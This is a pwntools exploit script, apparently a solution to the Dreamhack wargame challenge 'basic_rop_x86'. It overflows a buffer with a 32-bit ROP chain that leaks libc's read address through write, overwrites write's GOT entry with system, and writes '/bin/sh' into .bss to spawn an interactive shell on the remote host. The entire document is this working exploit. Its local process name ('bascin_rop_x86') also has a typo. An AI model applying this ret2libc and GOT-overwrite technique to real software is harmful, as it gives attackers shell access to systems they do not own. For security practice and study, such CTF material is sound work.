from pwn import *

context.log_level='debug'
context.arch='i386'

def start():
    if args.REMOTE:
        port=15276
        host='host8.dreamhack.games'
        return remote(host,port)
    else:
        return process('./bascin_rop_x86')
r=start()

e=ELF("./basic_rop_x86")
libc=ELF("./libc.so.6")
bss = e.bss()

read_got=e.got['read']
read_plt=e.plt['read']
write_got=e.got['write']
write_plt=e.plt['write']

#ret=0x080483c2
pop=0x08048689

payload = b'a'*0x44 + b'b'*0x4
#32비트 함수 호출 구조
payload+=p32(write_plt)
payload+=p32(pop)#return address 가젯
payload+=p32(1)
payload+=p32(read_got)
payload+=p32(4)

payload+=p32(read_plt)
payload+=p32(pop)#return address 가젯
payload+=p32(0)
payload+=p32(write_got)#write_got 주소 조작 
payload+=p32(4)

payload+=p32(read_plt)
payload+=p32(pop)#return address 가젯
payload+=p32(0)
payload+=p32(bss)   #/bin/sh 저장 변수
payload+=p32(8)

payload += p32(write_plt)
payload += b'A' * 0x4
payload += p32(bss)

r.send(payload)

r.recvuntil(b'a'*0x40) #출력의 대상이 buf변수에 한하기에 그다음은 우리가 설정
read_addr=u32(r.recvn(4))

libc_base=read_addr-libc.symbols['read']
system=libc_base+libc.symbols['system']

r.send(p32(system))
r.send(b'/bin/sh\x00')
r.interactive()